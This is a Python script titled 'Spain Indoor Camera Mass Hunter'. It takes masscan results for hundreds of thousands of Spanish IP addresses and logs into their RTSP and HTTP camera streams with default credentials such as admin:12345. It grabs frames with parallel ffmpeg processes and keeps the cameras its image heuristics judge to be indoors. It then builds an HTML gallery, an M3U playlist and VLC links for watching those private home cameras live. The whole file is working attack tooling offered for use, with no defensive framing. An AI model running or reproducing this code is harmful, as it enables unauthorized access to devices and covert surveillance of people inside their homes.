#!/usr/bin/env python3
"""
Spain Indoor Camera Mass Hunter
- Parallel frame grabbing from 470K+ IPs (no YOLO during grab)
- Fast CV-based indoor/outdoor classification post-grab
- Builds interactive selector with only HOME/INDOOR cameras
"""

import os, re, sys, json, time, shutil, subprocess, signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import cv2
import numpy as np

# ── Working directory ──
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

# ── Config ──
MASSCAN_FILE = os.path.join(SCRIPT_DIR, "spain_masscan.txt")
FRAMES_DIR = os.path.join(SCRIPT_DIR, "spain_indoor_frames")
OUT_DIR = os.path.join(SCRIPT_DIR, "spain_indoor_verify")
IMG_DIR = os.path.join(OUT_DIR, "screenshots")
EXISTING_FRAMES_DIR = os.path.join(SCRIPT_DIR, "spain_frames")  # Previous scan results
MAX_WORKERS = 80          # parallel ffmpeg processes
FFMPEG_TIMEOUT = 4        # seconds per probe
TARGET_INDOOR = 1590      # stop after this many indoor cameras
BATCH_REPORT = 50         # report every N frames

# RTSP URL patterns to try (ordered by likelihood)
RTSP_PATHS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/1",
    "/h264/ch1/main/av_stream",
    "/stream1",
    "/live/ch00_0",
    "/onvif1",
    "/11",
    "/cam/realmonitor?channel=1&subtype=0",
]

# Default credentials
CREDS = [
    ("admin", "12345"),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "1111"),
    ("root", "pass"),
    ("root", "1234"),
]

os.makedirs(FRAMES_DIR, exist_ok=True)
os.makedirs(OUT_DIR, exist_ok=True)
os.makedirs(IMG_DIR, exist_ok=True)

# Track already-captured IPs
already_captured = set()
for f in os.listdir(FRAMES_DIR):
    if f.endswith('.jpg'):
        already_captured.add(f.replace('.jpg', '').replace('_', '.'))

print(f"[*] Already have {len(already_captured)} frames from previous runs")


def parse_masscan_ips():
    """Extract unique IPs from masscan results, prioritizing camera-likely ports."""
    ip_ports = {}
    with open(MASSCAN_FILE) as f:
        for line in f:
            # Masscan format: Host: 86.109.107.107 ()  Ports: 554/open/tcp//rtsp//
            m = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+).*Ports:\s+(\d+)/', line)
            if not m:
                continue
            ip, port = m.group(1), m.group(2)
            if ip not in ip_ports:
                ip_ports[ip] = set()
            ip_ports[ip].add(port)

    # Priority: IPs with RTSP (554) or Hikvision (8000) are most likely cameras
    # Secondary: IPs with HTTP snapshot ports (8080)
    # Skip: IPs with only 80/443 (generic web servers)
    priority = []
    secondary = []
    for ip, ports in ip_ports.items():
        if ip in already_captured:
            continue
        if '554' in ports or '8000' in ports:
            priority.append(ip)
        elif '8080' in ports:
            secondary.append(ip)
        # Skip IPs with only 80/443 — too many generic web servers

    import random
    random.shuffle(priority)
    random.shuffle(secondary)
    print(f"[*] Priority IPs (port 554/8000): {len(priority)}")
    print(f"[*] Secondary IPs (port 8080): {len(secondary)}")
    return priority + secondary


def grab_frame(ip):
    """Try to grab a single frame from a camera IP. Returns (ip, filepath) or None."""
    out_file = os.path.join(FRAMES_DIR, ip.replace('.', '_') + '.jpg')
    if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
        return (ip, out_file)

    # Try RTSP first (most common for cameras)
    for user, passwd in CREDS[:3]:  # Top 3 creds only for speed
        for path in RTSP_PATHS[:4]:  # Top 4 paths only
            auth = f"{user}:{passwd}@" if user else ""
            url = f"rtsp://{auth}{ip}:554{path}"
            try:
                result = subprocess.run(
                    ["ffmpeg", "-rtsp_transport", "tcp", "-i", url,
                     "-vframes", "1", "-f", "image2", "-y", out_file],
                    capture_output=True, timeout=FFMPEG_TIMEOUT
                )
                if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                    return (ip, out_file)
            except (subprocess.TimeoutExpired, Exception):
                pass

    # Try HTTP snapshot endpoints
    for port in ["80", "8080", "8000"]:
        for snap_path in [
            f"/ISAPI/Streaming/channels/101/picture",
            f"/cgi-bin/snapshot.cgi",
            f"/snap.jpg",
            f"/Streaming/channels/1/picture",
        ]:
            url = f"http://admin:12345@{ip}:{port}{snap_path}"
            try:
                result = subprocess.run(
                    ["ffmpeg", "-i", url, "-vframes", "1", "-f", "image2", "-y", out_file],
                    capture_output=True, timeout=FFMPEG_TIMEOUT
                )
                if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                    return (ip, out_file)
            except (subprocess.TimeoutExpired, Exception):
                pass

    # Cleanup failed attempt
    if os.path.exists(out_file) and os.path.getsize(out_file) < 5000:
        os.unlink(out_file)
    return None


def classify_indoor(filepath):
    """Fast CV-based indoor/outdoor classification. Returns (is_indoor, score, details)."""
    try:
        img = cv2.imread(filepath)
        if img is None:
            return False, 0, "unreadable"

        h, w = img.shape[:2]
        hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

        brightness = np.mean(hsv[:, :, 2])
        saturation_mean = np.mean(hsv[:, :, 1])

        # Edge density
        edges = cv2.Canny(gray, 50, 150)
        edge_density = np.sum(edges > 0) / (h * w)

        # Sky detection (top quarter)
        top_q = hsv[:h // 4, :, :]
        top_bright = np.mean(top_q[:, :, 2])
        top_sat = np.mean(top_q[:, :, 1])

        # Green vegetation
        green_mask = cv2.inRange(hsv, np.array([35, 40, 40]), np.array([85, 255, 255]))
        green_pct = np.sum(green_mask > 0) / (h * w)

        # Blue sky
        blue_mask = cv2.inRange(hsv, np.array([100, 40, 100]), np.array([130, 255, 255]))
        blue_pct = np.sum(blue_mask > 0) / (h * w)

        # Warm colors (indoor lighting)
        warm_mask = cv2.inRange(hsv, np.array([10, 30, 100]), np.array([30, 200, 255]))
        warm_pct = np.sum(warm_mask > 0) / (h * w)

        # IR / night vision detection (grayscale camera)
        is_ir = saturation_mean < 30

        # Scoring
        indoor_score = 0
        outdoor_score = 0
        tags = []

        if brightness < 140:
            indoor_score += 1.5
            tags.append("dim")
        if edge_density > 0.08:
            indoor_score += 1
            tags.append("complex")
        if warm_pct > 0.05:
            indoor_score += 1
            tags.append("warm-light")
        if is_ir:
            indoor_score += 2
            tags.append("IR-nightvision")

        if top_bright > 200 and top_sat < 60:
            outdoor_score += 2
            tags.append("sky")
        if green_pct > 0.12:
            outdoor_score += 1.5
            tags.append("vegetation")
        if blue_pct > 0.08:
            outdoor_score += 1
            tags.append("blue-sky")
        if brightness > 180:
            outdoor_score += 0.5
            tags.append("bright")

        is_indoor = indoor_score > outdoor_score
        detail = f"in={indoor_score:.1f} out={outdoor_score:.1f} [{','.join(tags)}]"
        return is_indoor, indoor_score, detail

    except Exception as e:
        return False, 0, str(e)


def build_selector(indoor_cams):
    """Build interactive HTML selector + M3U for indoor cameras."""
    # Copy screenshots
    for cam in indoor_cams:
        src = cam["frame_path"]
        dst = os.path.join(IMG_DIR, os.path.basename(src))
        if not os.path.exists(dst):
            shutil.copy2(src, dst)
        cam["screenshot_url"] = f"screenshots/{os.path.basename(src)}"

    # Manifest
    manifest = {
        "title": "Spain HOME/INDOOR Cameras",
        "timestamp": str(time.time()),
        "total": len(indoor_cams),
        "priority_count": len(indoor_cams),
        "cameras": indoor_cams
    }
    with open(os.path.join(OUT_DIR, "manifest.json"), 'w') as f:
        json.dump(manifest, f, indent=2)

    # M3U
    m3u = "#EXTM3U\n# SPAIN HOME/INDOOR CAMERAS\n"
    for cam in indoor_cams:
        m3u += f"#EXTINF:-1,[🏠 ES] {cam['scene']} - {cam['ip']}\n"
        m3u += f"{cam['rtsp_urls'][0]}\n\n"
    with open(os.path.join(OUT_DIR, "cameras.m3u"), 'w') as f:
        f.write(m3u)

    # HTML Selector with VLC deep links
    html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🇪🇸🏠 Spain Indoor Cameras</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#111;color:#fff;padding:15px}
.header{text-align:center;margin-bottom:20px}
.header h1{font-size:2em;color:#ff6b6b;margin-bottom:5px}
.stats{display:flex;justify-content:center;gap:20px;margin:15px 0}
.stat{background:#222;padding:8px 16px;border-radius:5px}
.stat strong{color:#4ecdc4}
.controls{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:15px}
button{background:#4ecdc4;color:#000;border:none;padding:10px 18px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:0.95em}
button:hover{background:#45b8af}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
.card{background:#222;border-radius:8px;overflow:hidden;cursor:pointer;border:2px solid transparent;position:relative;transition:all 0.2s}
.card:hover{border-color:#4ecdc4;transform:translateY(-3px)}
.card.selected{border-color:#ff6b6b;box-shadow:0 0 12px rgba(255,107,107,0.5)}
.card input[type=checkbox]{position:absolute;top:8px;left:8px;width:18px;height:18px;z-index:5}
.card img{width:100%;height:160px;object-fit:cover;display:block}
.card .info{padding:8px 10px;font-size:0.85em}
.card .ip{color:#4ecdc4;font-weight:bold;word-break:break-all}
.card .tags{color:#999;font-size:0.8em;margin-top:3px}
.card .vlc-btn{display:block;background:#ff6b6b;color:#fff;text-align:center;padding:6px;font-size:0.85em;text-decoration:none;font-weight:bold}
.card .vlc-btn:hover{background:#ff5252}
.dl-btn{background:#ff6b6b;color:#fff}
#count{color:#ff6b6b}
</style>
</head>
<body>
<div class="header">
<h1>🇪🇸🏠 Spain Home/Indoor Cameras</h1>
<p>Only indoor cameras — tap screenshot to open in VLC</p>
<div class="stats">
<div class="stat">Indoor Cameras: <strong id="total">0</strong></div>
<div class="stat">Selected: <strong id="count">0</strong></div>
</div>
</div>
<div class="controls">
<button onclick="selAll()">✓ Select All</button>
<button onclick="deselAll()">✗ Deselect All</button>
<button class="dl-btn" onclick="dlPlaylist()">⬇️ Download Selected .m3u</button>
</div>
<div class="grid" id="grid"></div>
<script>
let cams=[],sel=new Set();
fetch('manifest.json').then(r=>r.json()).then(d=>{
    cams=d.cameras||[];
    document.getElementById('total').textContent=cams.length;
    render();
});
function render(){
    const g=document.getElementById('grid');
    g.innerHTML='';
    cams.forEach((c,i)=>{
        const d=document.createElement('div');
        d.className='card'+(sel.has(i)?' selected':'');
        const rtsp=c.rtsp_urls&&c.rtsp_urls[0]?c.rtsp_urls[0]:'';
        const vlcLink='vlc://'+rtsp;
        d.innerHTML=`
            <input type="checkbox" ${sel.has(i)?'checked':''} onchange="tog(${i})">
            <img src="${c.screenshot_url||''}" alt="${c.ip}" loading="lazy">
            <div class="info">
                <div class="ip">${c.ip}</div>
                <div class="tags">${c.scene} · ${(c.size_bytes/1024).toFixed(0)}KB</div>
            </div>
            <a class="vlc-btn" href="${vlcLink}" onclick="event.stopPropagation()">▶ Open in VLC</a>`;
        d.onclick=e=>{if(e.target.tagName!=='INPUT'&&e.target.tagName!=='A'){
            const cb=d.querySelector('input');cb.checked=!cb.checked;tog(i);}};
        g.appendChild(d);
    });
}
function tog(i){sel.has(i)?sel.delete(i):sel.add(i);upd();}
function selAll(){cams.forEach((_,i)=>sel.add(i));upd();}
function deselAll(){sel.clear();upd();}
function upd(){
    document.getElementById('count').textContent=sel.size;
    document.querySelectorAll('.card').forEach((c,i)=>{
        c.classList.toggle('selected',sel.has(i));
        c.querySelector('input').checked=sel.has(i);
    });
}
function dlPlaylist(){
    if(!sel.size){alert('Select cameras first');return;}
    let m='#EXTM3U\\n';
    sel.forEach(i=>{
        const c=cams[i];
        if(c.rtsp_urls&&c.rtsp_urls[0])
            m+=`#EXTINF:-1,[ES] ${c.ip}\\n${c.rtsp_urls[0]}\\n`;
    });
    const b=new Blob([m],{type:'audio/x-mpegurl'});
    const a=document.createElement('a');
    a.href=URL.createObjectURL(b);
    a.download=`spain_indoor_${sel.size}.m3u`;
    a.click();
}
</script>
</body>
</html>"""
    with open(os.path.join(OUT_DIR, "screenshot_selector.html"), 'w') as f:
        f.write(html)

    print(f"\n[✓] Built selector with {len(indoor_cams)} indoor cameras")
    print(f"    → {OUT_DIR}/screenshot_selector.html")
    print(f"    → {OUT_DIR}/cameras.m3u")
    print(f"    → {OUT_DIR}/manifest.json")


def main():
    t0 = time.time()

    # Parse all IPs
    print(f"\n{'='*60}")
    print(f"SPAIN INDOOR CAMERA MASS HUNTER")
    print(f"Target: {TARGET_INDOOR} home/indoor cameras")
    print(f"{'='*60}\n")

    all_ips = parse_masscan_ips()
    print(f"[*] Total IPs to probe: {len(all_ips)}")

    # Also include already-captured frames from both dirs
    existing_frames = []
    for fdir in [FRAMES_DIR, EXISTING_FRAMES_DIR]:
        if not os.path.isdir(fdir):
            continue
        for f in os.listdir(fdir):
            if f.endswith('.jpg'):
                fpath = os.path.join(fdir, f)
                if os.path.getsize(fpath) > 5000:
                    ip = f.replace('.jpg', '').replace('_', '.')
                    existing_frames.append((ip, fpath))

    print(f"[*] Pre-existing valid frames: {len(existing_frames)}")

    # Classify existing frames first
    indoor_cams = []
    outdoor_count = 0
    print(f"\n[PHASE 1] Classifying {len(existing_frames)} existing frames...")

    for ip, fpath in existing_frames:
        is_indoor, score, detail = classify_indoor(fpath)
        if is_indoor:
            indoor_cams.append({
                "ip": ip,
                "scene": detail.split('[')[1].rstrip(']') if '[' in detail else "indoor",
                "priority": True,
                "size_bytes": os.path.getsize(fpath),
                "frame_path": fpath,
                "rtsp_urls": [f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"],
                "http_urls": [f"http://{ip}/"],
                "indoor_score": score,
                "classify_detail": detail
            })
        else:
            outdoor_count += 1

    print(f"[+] From existing: {len(indoor_cams)} indoor, {outdoor_count} outdoor")

    # Build selector immediately with existing frames
    if len(indoor_cams) > 0:
        indoor_cams.sort(key=lambda x: x.get('indoor_score', 0), reverse=True)
        build_selector(indoor_cams)
        print(f"[✓] Initial selector built with {len(indoor_cams)} indoor cameras")

    if len(indoor_cams) >= TARGET_INDOOR:
        indoor_cams.sort(key=lambda x: x.get('indoor_score', 0), reverse=True)
        indoor_cams = indoor_cams[:TARGET_INDOOR]
        build_selector(indoor_cams)
        print(f"\n[✓] DONE! Found {TARGET_INDOOR} indoor cameras from existing frames in {time.time()-t0:.0f}s")
        return

    # PHASE 2: Grab new frames in parallel
    remaining = TARGET_INDOOR - len(indoor_cams)
    print(f"\n[PHASE 2] Need {remaining} more indoor cameras. Probing {len(all_ips)} IPs with {MAX_WORKERS} threads...")

    grabbed = 0
    probed = 0
    batch_start = time.time()

    stop_flag = False

    def signal_handler(sig, frame):
        nonlocal stop_flag
        print("\n[!] Ctrl+C — finishing up with what we have...")
        stop_flag = True

    signal.signal(signal.SIGINT, signal_handler)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit in chunks to avoid memory explosion
        chunk_size = 500
        for chunk_start in range(0, len(all_ips), chunk_size):
            if stop_flag or len(indoor_cams) >= TARGET_INDOOR:
                break

            chunk = all_ips[chunk_start:chunk_start + chunk_size]
            futures = {executor.submit(grab_frame, ip): ip for ip in chunk}

            for future in as_completed(futures):
                if stop_flag or len(indoor_cams) >= TARGET_INDOOR:
                    break

                probed += 1
                result = future.result()
                if result:
                    ip, fpath = result
                    grabbed += 1

                    # Classify immediately
                    is_indoor, score, detail = classify_indoor(fpath)
                    if is_indoor:
                        indoor_cams.append({
                            "ip": ip,
                            "scene": detail.split('[')[1].rstrip(']') if '[' in detail else "indoor",
                            "priority": True,
                            "size_bytes": os.path.getsize(fpath),
                            "frame_path": fpath,
                            "rtsp_urls": [f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"],
                            "http_urls": [f"http://{ip}/"],
                            "indoor_score": score,
                            "classify_detail": detail
                        })

                    # Auto-update selector on every new indoor cam found
                    if is_indoor:
                        indoor_cams.sort(key=lambda x: x.get('indoor_score', 0), reverse=True)
                        build_selector(indoor_cams)

                if probed % BATCH_REPORT == 0:
                    elapsed = time.time() - t0
                    rate = probed / max(elapsed, 1)
                    print(f"  [{probed}/{len(all_ips)}] {elapsed:.0f}s | "
                          f"grabbed={grabbed} indoor={len(indoor_cams)}/{TARGET_INDOOR} | "
                          f"{rate:.1f} ip/s")

    # Final build
    indoor_cams.sort(key=lambda x: x.get('indoor_score', 0), reverse=True)
    if len(indoor_cams) > TARGET_INDOOR:
        indoor_cams = indoor_cams[:TARGET_INDOOR]

    build_selector(indoor_cams)

    elapsed = time.time() - t0
    print(f"\n{'='*60}")
    print(f"COMPLETE in {elapsed:.0f}s")
    print(f"  Probed: {probed} IPs")
    print(f"  Frames grabbed: {grabbed}")
    print(f"  Indoor cameras: {len(indoor_cams)}")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
